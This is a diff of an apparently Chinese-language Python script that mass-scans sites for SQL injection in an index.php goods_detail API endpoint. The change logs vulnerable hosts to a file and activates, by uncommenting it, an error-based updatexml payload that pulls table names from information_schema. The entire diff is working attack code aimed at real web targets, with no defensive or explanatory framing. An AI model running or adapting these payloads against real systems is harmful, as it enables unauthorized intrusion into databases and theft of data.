@@ -29,12 +29,12 @@ def sqli():
                         if "syntax" in r.text:
                             print("上诉地址存在SQL注入")
                             with open("sqli.txt", "a+") as w:
-                                w.write(url[0] + "存在SQL注入" + "\n")
-#                             database_name = re.findall("General error: 1105 XPATH syntax error: '~(.+?)~'", r.text)
-#                             sqli_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='{0}' limit 0,1),0x7e),0x7e),1)".format(
-#                                 database_name[0])
-#                             sqli_url = "https://" + url[0] + sqli_path
-#                             print(sqli_url)
+                                w.write("http://" + url[0] + "/" + "存在SQL注入" + "\n")
+                            database_name = re.findall("General error: 1105 XPATH syntax error: '~(.+?)~'", r.text)
+                            sqli_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='{0}' limit 0,1),0x7e),0x7e),1)".format(
+                                database_name[0])
+                            sqli_url = "https://" + url[0] + sqli_path
+                            print(sqli_url)
 
                     except Exception as e:
                         try:
@@ -46,7 +46,7 @@ def sqli():
                                 if "syntax" in r.text:
                                     print("上诉地址存在SQL注入")
                                     with open("sqli.txt", "a+") as w:
-                                        w.write(url[0] + "存在SQL注入" + "\n")
+                                        w.write("https://" + url[0] + "/" + "存在SQL注入" + "\n")
                                     database_name = re.findall("General error: 1105 XPATH syntax error: '~(.+?)~'", r.text)
                                     sqli_path = "/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='{0}' limit 0,1),0x7e),1)".format(database_name[0])
                                     sqli_url = "https://" + url[0] + sqli_path
